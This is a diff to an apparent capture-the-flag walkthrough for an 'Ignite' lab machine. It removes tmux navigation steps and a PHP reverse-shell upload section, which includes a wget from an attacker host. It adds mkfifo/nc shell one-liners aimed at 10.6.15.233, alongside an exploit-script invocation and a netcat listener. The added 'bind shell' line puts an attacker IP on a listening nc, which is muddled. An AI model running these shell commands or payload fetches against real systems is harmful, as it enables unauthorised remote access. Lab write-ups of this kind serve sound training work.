@@ -150,20 +150,6 @@ This creates what appears to be a duplicate window. However, these windows are i
 
 ![Vertical Split](assets/ignite-33.png)  
 
-If the cursor is not in the right pane, use the following command to move the cursor into the right pane: 
-
-`:>CTRL + b`, then right arrow
-
-From this position, create a horizontal split  
-
-`:>CTRL + b`, then `"` (Double quotes)  
-
-![Three Panes](assets/ignite-34.png)  
-
-If the cursor is not in the left pane, use the following command to move the cursor into the left pane:  
-
-`:>CTRL + b`, then left arrow  
-
 ### Gain initial access  
 
 `:> python3 50477.py -u http://10.201.125.124`
@@ -228,43 +214,15 @@ Didn't work
 
 ![switch user attempt](assets/ignite-25.png)  
 
-### Upload Reverse Shell  
-
-Move the cursor to the top-right pane. Consistent with previous instructions, use `:>CTRL + b`, then arrow keys to move the cursor among the active panes.
-
-Verify attacker machine ip address  
-
-`:> ip addr show`  
-
-![Attacker IP](assets/ignite-27a.png)  
-
-Modify a php reverse shell to include the attacker IP and an appropriate port. 
-
-![Shell Edit](assets/ignite-29a.png)  
-
-Start a simple server in the upper-right pane.  
-
-`:> python -m http.server 4445`
-
-![Python Shell](assets/ignite-30a.png)
+### Set up a Bind Shell
 
 Start a netcat listener in the other pane, using the port in the reverse shell.
 
 `:> nc -lvnp 8888`  
 
-![reverse shell setup](assets/ignite-31.png)  
+![reverse shell setup](assets/ignite-31a.png)  
 
-From the target device, use wget to download the reverse shell from the attacking device  
+The bind shell pattern:  
+`:> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l <ATTACKER IP> <PORT> > /tmp/f`  
 
-`:> wget -O myRevShell.php 10.6.15.233:4445/prs.php`  
-
-and observe the download from the attacking device  
-
-![Download](assets/ignite-32.png)  
-
- 
-
-![Download Server](assets/ignite-33.png)
-
-
-
+`:> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 10.6.15.233 4444 > /tmp/f`
